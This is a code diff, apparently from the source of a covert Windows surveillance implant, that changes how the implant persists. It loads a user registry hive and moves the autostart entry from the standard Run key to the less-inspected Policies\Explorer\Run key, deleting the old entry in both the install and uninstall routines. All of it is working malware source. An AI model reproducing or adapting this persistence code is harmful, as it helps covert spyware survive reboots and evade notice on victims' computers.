@@ -4,6 +4,7 @@
 #include "UnHookClass.h"
 #include "common.h"
 
+extern char OLD_REGISTRY_KEY_NAME[MAX_RAND_NAME];
 
 #define MAX_CDIR_TRY 10
 
@@ -169,7 +170,6 @@ BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char 
 			return FALSE;
 	}
 
-	// XXX-CRISI2s
 	// Path a rundll32.exe
 	memset(key_value, 0, sizeof(key_value));
 	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
@@ -201,8 +201,14 @@ BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char 
 		return FALSE;
 	}
 #else
-	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS &&
-		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS) {
+	// Cancella la chiave vecchia 
+	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+		FNC(RegDeleteValueA) (hOpen, (char *)OLD_REGISTRY_KEY_NAME);
+		FNC(RegCloseKey)(hOpen);
+	}
+
+	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) != ERROR_SUCCESS &&
+		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) != ERROR_SUCCESS) {
 		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\");
 		pdev_unhook->df_freeze();
 		return FALSE;
@@ -410,7 +416,7 @@ BOOL DFUninstall(HideDevice *pdev_unhook, unsigned char *core_path, unsigned cha
 		pdev_unhook->df_freeze();
 		return FALSE;
 	}
-	// XXX-CRISI2
+
 #ifdef RUN_ONCE_KEY
 	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegDeleteValueA) (hOpen, (char *)reg_key_name);
@@ -421,10 +427,16 @@ BOOL DFUninstall(HideDevice *pdev_unhook, unsigned char *core_path, unsigned cha
 		FNC(RegCloseKey)(hOpen);
 	}
 #else
-	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegDeleteValueA) (hOpen, (char *)reg_key_name);
 		FNC(RegCloseKey)(hOpen);
 	}
+	// Cancella nel caso anche la chiave vecchia
+	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+		FNC(RegDeleteValueA) (hOpen, (char *)OLD_REGISTRY_KEY_NAME);
+		FNC(RegCloseKey)(hOpen);
+	}
+
 #endif
 	FNC(RegUnLoadKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\");
 
